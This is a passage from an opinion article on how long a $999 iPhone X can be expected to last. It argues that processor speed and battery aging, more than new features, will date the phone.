But carriers have stopped doing that, and you’re now given a clear choice of how much to spend and how often. If you decide to go with an iPhone X, you may be looking at $1,000 every couple years. As long as phones are improving this quickly, it might make sense to spend less and upgrade just as frequently.

Of course, not everyone will see the need to upgrade after just two years. If you add a battery pack, battery life issues go away. If you don’t use a ton of apps, performance issues may not matter as much. And Apple doesn’t actually introduce groundbreaking features all that often. If you haven’t purchased a phone since the iPhone 5S, the biggest features you’d have missed out on were bigger screens, mobile payments, and an optional second camera. I guess you could throw 3D Touch in there, but I’m not convinced that feature has sold a single phone.

It’s processors and battery, not features, that’ll date the iPhone X

From that perspective, iPhones — and smartphones in general — may have a longer lifespan than many of us absorbed in the tech world would let on. I know plenty of people who hang onto phones for far longer than two years, even though I tend to grow impatient with my own two-year-old phones. Chances are, the iPhone X won’t grow dated through the introduction of revolutionary new features within the next two or three years. But that doesn’t guarantee it’ll remain a snappy performer with all-day battery life that far down the road.

And that’s really the problem I worry about. Even if you want to hang onto an iPhone X for three or four years, I think there’s an open question of how well it’ll run at that point. Every phone and computer has to slow down eventually, but when you invest more into one, you usually expect it to hang on somewhat longer. The iPhone X will likely age as quickly as any other iPhone — it’ll just look better while doing it.",How long should a $999 iPhone last?,
